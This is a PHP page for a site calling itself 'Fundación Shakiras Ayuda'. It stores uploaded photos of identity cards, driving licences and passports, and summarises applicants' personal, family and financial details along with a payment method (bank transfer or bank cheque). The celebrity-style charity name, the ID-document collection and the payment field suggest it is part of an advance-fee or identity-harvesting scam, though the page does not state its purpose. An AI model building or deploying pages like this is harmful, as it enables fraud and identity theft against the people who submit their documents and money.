<?php
require __DIR__ . '/lang.php';

/* Envoi des justificatifs depuis verifdocs.php : valider, stocker hors accès direct, puis remercier. */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['recto'])) {
    $type = isset($_POST['document_type']) ? (string)$_POST['document_type'] : 'cni';
    $hasConsent = isset($_POST['consent']) && $_POST['consent'] === 'yes';
    $needsBack = ($type !== 'passeport');
    $requiredUploads = ['recto'];
    if ($needsBack) $requiredUploads[] = 'verso';
    if (!$hasConsent || !in_array($type, ['cni', 'permis', 'passeport'], true)) {
        http_response_code(400); exit('Veuillez vérifier le type de document et votre consentement.');
    }
    foreach ($requiredUploads as $field) {
        if (!isset($_FILES[$field]) || !is_array($_FILES[$field]) || $_FILES[$field]['error'] !== UPLOAD_ERR_OK) {
            http_response_code(400); exit('Une photo requise est manquante ou n’a pas pu être envoyée.');
        }
    }
    $allowed = ['image/jpeg' => 'jpg', 'image/png' => 'png', 'image/webp' => 'webp'];
    $validated = [];
    $finfo = new finfo(FILEINFO_MIME_TYPE);
    foreach ($requiredUploads as $field) {
        $upload = $_FILES[$field];
        if (!is_uploaded_file($upload['tmp_name']) || $upload['size'] < 1 || $upload['size'] > 10 * 1024 * 1024) {
            http_response_code(400); exit('Chaque image doit peser moins de 10 Mo.');
        }
        $mime = $finfo->file($upload['tmp_name']);
        if (!isset($allowed[$mime])) {
            http_response_code(400); exit('Format d’image non accepté. Utilisez JPG, PNG ou WebP.');
        }
        $validated[$field] = ['tmp' => $upload['tmp_name'], 'ext' => $allowed[$mime]];
    }
    $reference = 'SA-' . date('Y') . '-' . strtoupper(bin2hex(random_bytes(6)));
    $baseDir = __DIR__ . '/dossiers';
    $docDir = $baseDir . '/' . $reference . '/Documents';
    if (!is_dir($baseDir) || !is_writable($baseDir) || !mkdir($docDir, 0700, true)) {
        http_response_code(500); exit('Impossible d’enregistrer les documents pour le moment.');
    }
    $saved = [];
    foreach ($validated as $field => $upload) {
        $destName = ($field === 'recto' ? 'recto' : 'verso') . '.' . $upload['ext'];
        if (!move_uploaded_file($upload['tmp'], $docDir . '/' . $destName)) {
            foreach ($saved as $path) @unlink($path);
            http_response_code(500); exit('Échec de l’enregistrement des documents. Veuillez réessayer.');
        }
        $saved[] = $docDir . '/' . $destName;
    }
    $meta = "Référence: {$reference}\nType de document: {$type}\nDate: " . date(DATE_ATOM) . "\n";
    file_put_contents(dirname($docDir) . '/Informations.txt', $meta, LOCK_EX);
    header('Location: merci.php?ref=' . rawurlencode($reference) . '&lang=' . rawurlencode($SA_LANG), true, 303);
    exit;
}

/* ---------- Nettoyage ---------- */
function clean($v) { return trim(strip_tags((string)$v)); }

$champs = ['civilite','nom','naissance','pays','ville','adresse','indicatif','telephone',
           'marital','profession','enfants','nb_enfants','montant','source','mode_paiement','lang'];

$D = [];
foreach ($champs as $c) { $D[$c] = isset($_POST[$c]) ? clean($_POST[$c]) : ''; }

/* ---------- Validation serveur ---------- */
$obligatoires = ['civilite','nom','naissance','pays','ville','adresse','telephone',
                 'marital','profession','enfants','montant','source','mode_paiement'];
$erreurs = [];
foreach ($obligatoires as $c) { if ($D[$c] === '') { $erreurs[] = t($c); } }
if ($D['telephone'] !== '' && !preg_match('/^[0-9 +().\-]{6,20}$/', $D['telephone'])) { $erreurs[] = t('telephone'); }

/* ---------- Noms lisibles pour l'affichage ---------- */
$CIV = [
  'es' => ['sr'=>'Sr.','sra'=>'Sra.','srta'=>'Srta.','otro'=>'Otro'],
  'fr' => ['sr'=>'M.','sra'=>'Mme','srta'=>'Mlle','otro'=>'Autre'],
  'en' => ['sr'=>'Mr','sra'=>'Mrs','srta'=>'Miss','otro'=>'Other'],
  'de' => ['sr'=>'Herr','sra'=>'Frau','srta'=>'Fräulein','otro'=>'Divers'],
  'pt' => ['sr'=>'Sr.','sra'=>'Sra.','srta'=>'Srta.','otro'=>'Outro'],
];
$MAR = [
  'es' => ['soltero'=>'Soltero(a)','casado'=>'Casado(a)','union'=>'Unión libre','viudo'=>'Viudo(a)','divorciado'=>'Divorciado(a)'],
  'fr' => ['soltero'=>'Célibataire','casado'=>'Marié(e)','union'=>'Union libre','viudo'=>'Veuf(ve)','divorciado'=>'Divorcé(e)'],
  'en' => ['soltero'=>'Single','casado'=>'Married','union'=>'Cohabiting','viudo'=>'Widowed','divorciado'=>'Divorced'],
  'de' => ['soltero'=>'Ledig','casado'=>'Verheiratet','union'=>'Eheähnliche Gemeinschaft','viudo'=>'Verwitwet','divorciado'=>'Geschieden'],
  'pt' => ['soltero'=>'Solteiro(a)','casado'=>'Casado(a)','union'=>'União de facto','viudo'=>'Viúvo(a)','divorciado'=>'Divorciado(a)'],
];
$SRC = [
  'es' => ['tv'=>'Televisión','radio'=>'Radio','social'=>'Redes sociales','affiche'=>'Cartel publicitario'],
  'fr' => ['tv'=>'Télévision','radio'=>'Radio','social'=>'Réseaux sociaux','affiche'=>'Affiche publicitaire'],
  'en' => ['tv'=>'Television','radio'=>'Radio','social'=>'Social networks','affiche'=>'Advertising poster'],
  'de' => ['tv'=>'Fernsehen','radio'=>'Radio','social'=>'Soziale Netzwerke','affiche'=>'Werbeplakat'],
  'pt' => ['tv'=>'Televisão','radio'=>'Rádio','social'=>'Redes sociais','affiche'=>'Cartaz publicitário'],
];
$OUI = ['si','sí','oui','yes','sim'];

function pays_nom($code, $lang) {
  // Table ISO2 -> nom localisé via un petit mapping (ou extension intl si dispo)
  static $m = null;
  if ($m === null) {
    $m = ['ES'=>['España','Espagne','Spain','Espanha'], 'FR'=>['Francia','France','France','França'],
          'MA'=>['Marruecos','Maroc','Morocco','Marrocos'], 'DZ'=>['Argelia','Algérie','Algeria','Argélia'],
          'SN'=>['Senegal','Sénégal','Senegal','Senegal'], 'CI'=>["Côte d'Ivoire","Côte d'Ivoire","Côte d'Ivoire","Côte d'Ivoire"],
          'CM'=>['Camerún','Cameroun','Cameroon','Camarões'], 'BE'=>['Bélgica','Belgique','Belgium','Bélgica'],
          'CH'=>['Suiza','Suisse','Switzerland','Suíça'], 'CA'=>['Canadá','Canada','Canada','Canadá'],
          'US'=>['Estados Unidos','États-Unis','United States','Estados Unidos'], 'MX'=>['México','Mexique','Mexico','México'],
          'BR'=>['Brasil','Brésil','Brazil','Brasil'], 'CO'=>['Colombia','Colombie','Colombia','Colômbia'],
          'AR'=>['Argentina','Argentine','Argentina','Argentina'], 'PT'=>['Portugal','Portugal','Portugal','Portugal'],
          'IT'=>['Italia','Italie','Italy','Itália'], 'DE'=>['Alemania','Allemagne','Germany','Alemanha'],
          'GB'=>['Reino Unido','Royaume-Uni','United Kingdom','Reino Unido'], 'NL'=>['Países Bajos','Pays-Bas','Netherlands','Países Baixos']];
  }
  $i = ['es'=>0,'fr'=>1,'en'=>2,'de'=>3,'pt'=>4][$lang] ?? 0;
  if (isset($m[$code])) { return $m[$code][$i]; }
  if (function_exists('locale_get_display_region')) { return locale_get_display_region('-' . $code, $lang); }
  return $code;
}

$reference = 'SA-' . date('Y') . '-' . strtoupper(bin2hex(random_bytes(6)));
$D['reference'] = $reference;

$lignes = [
  'civilite'   => $CIV[$SA_LANG][$D['civilite']] ?? $D['civilite'],
  'nom'        => $D['nom'],
  'naissance'  => $D['naissance'],
  'pays'       => pays_nom($D['pays'], $SA_LANG) . ' (' . $D['pays'] . ')',
  'ville'      => $D['ville'],
  'adresse'    => $D['adresse'],
  'telephone'  => $D['indicatif'] . ' ' . $D['telephone'],
  'marital'    => $MAR[$SA_LANG][$D['marital']] ?? $D['marital'],
  'profession' => $D['profession'],
  'enfants'    => (in_array(strtolower($D['enfants']), $OUI, true) ? 'Sí / Oui / Ja' : 'No / Non / Nein')
                  . ($D['nb_enfants'] !== '' ? ' (' . $D['nb_enfants'] . ')' : ''),
  'montant'    => montant_nom($D['montant'], $SA_LANG),
  'source'     => $SRC[$SA_LANG][$D['source']] ?? $D['source'],
  'mode_paiement' => (['virement_bancaire' => ['es'=>'Transferencia bancaria','fr'=>'Virement bancaire','en'=>'Bank transfer','de'=>'Banküberweisung','pt'=>'Transferência bancária'], 'cheque_banque' => ['es'=>'Cheque bancario','fr'=>'Chèque de banque','en'=>'Bank cheque','de'=>'Bankscheck','pt'=>'Cheque bancário']][$D['mode_paiement']][$SA_LANG] ?? $D['mode_paiement']),
];
?>
<!DOCTYPE html>
<html lang="<?= e($SA_LANG) ?>">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><?= h('recap_t') ?> — Fundación Shakiras Ayuda</title>
<link rel="icon" type="image/svg+xml" href="favicon.svg">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500&display=swap" rel="stylesheet">
<link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
<header class="site">
  <div class="wrap nav">
    <a class="brand" href="index.html">
      <svg viewBox="0 0 120 120" width="42" height="42" aria-hidden="true">
        <defs><linearGradient id="g1" x1="0" y1="0" x2="1" y2="1">
          <stop offset="0" stop-color="#3B0A6B"/><stop offset="1" stop-color="#E62E86"/></linearGradient></defs>
        <circle cx="60" cy="60" r="57" fill="#FDEAF3"/>
        <path fill="url(#g1)" d="M60 78C42 64 30 53 30 42c0-9 7-16 15-16 7 0 12 5 15 11 3-6 8-11 15-11 8 0 15 7 15 16 0 11-12 22-30 36z"/>
        <g fill="#3B0A6B" opacity=".92">
          <path d="M45 95C29 95 16 88 12 77c-1-4 3-7 7-5 3 1 5 4 6 7 4 7 12 10 20 10z"/>
          <path d="M75 95c16 0 29-7 33-18 1-4-3-7-7-5-3 1-5 4-6 7-4 7-12 10-20 10z"/>
        </g>
      </svg>
      <span class="bt"><b>Fundación Shakiras Ayuda</b><i><?= h('recap_link') ?></i></span>
    </a>
  </div>
</header>

<main class="wrap">
  <div class="fhead">
    <h1><?= h('recap_t') ?></h1>
    <p><?= h('recap_lead') ?></p>
  </div>

  <?php if ($erreurs): ?>
    <div class="err-msg"><?= h('err') ?> <?= e(implode(', ', $erreurs)) ?></div>
  <?php endif; ?>

  <div class="recap">
    <table class="recap-t">
      <?php foreach ($lignes as $k => $v): ?>
        <tr><th><?= h($k) ?></th><td><?= e($v) ?></td></tr>
      <?php endforeach; ?>
      <tr><th><?= h('ref') ?></th><td><b><?= e($reference) ?></b></td></tr>
    </table>

    <div class="actions">
      <!-- Bouton principal : redirige vers verifdocs.php en repostant les données -->
      <form action="verifdocs.php" method="post" style="display:inline">
        <?php foreach ($D as $k => $v): ?>
          <input type="hidden" name="<?= e($k) ?>" value="<?= e($v) ?>">
        <?php endforeach; ?>
        <input type="hidden" name="reference" value="<?= e($reference) ?>">
        <button class="btn btn-p" type="submit"><?= h('recap_ok') ?></button>
      </form>

      <!-- Retour au formulaire, valeurs conservées -->
      <form action="souscrire.html" method="get" style="display:inline">
        <button class="btn btn-g" type="button" onclick="history.back()"><?= h('recap_edit') ?></button>
      </form>
    </div>
  </div>
</main>

<footer class="site">
  <div class="wrap fbot" style="border:none;margin:0;padding:0">© <?= date('Y') ?> Fundación Shakiras Ayuda</div>
</footer>
</body>
</html>